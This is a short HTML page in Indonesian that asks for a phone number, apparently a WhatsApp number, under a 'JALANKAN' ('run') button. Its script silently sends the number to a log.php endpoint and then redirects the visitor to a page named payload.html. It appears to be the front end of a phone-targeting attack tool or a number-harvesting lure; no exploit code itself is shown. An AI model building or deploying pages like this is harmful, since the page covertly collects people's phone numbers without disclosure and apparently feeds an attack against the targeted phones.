<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #0a0a0c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
        .card { background: #15151b; padding: 40px; border-radius: 30px; text-align: center; border: 1px solid #330066; }
        input { background: #20202a; border: none; padding: 15px 25px; border-radius: 50px; color: #fff; width: 250px; outline: none; margin-bottom: 20px; text-align: center; border: 2px solid #4b0082; }
        button { background: #6a0dad; color: white; padding: 15px 40px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px #8a2be2; }
        button:active { transform: scale(0.95); box-shadow: 0 0 40px #8a2be2; }
        * { -webkit-tap-highlight-color: transparent; outline: none; }
    </style>
</head>
<body>
    <div class="card">
        <input type="text" id="wa" placeholder="08XXXXXXXXXX">
        <button onclick="proses()">JALANKAN</button>
    </div>
    <script>
        function proses() {
            let num = document.getElementById('wa').value;
            fetch('log.php?num=' + encodeURIComponent(num));
            window.location.href = 'payload.html';
        }
    </script>
</body>
</html>
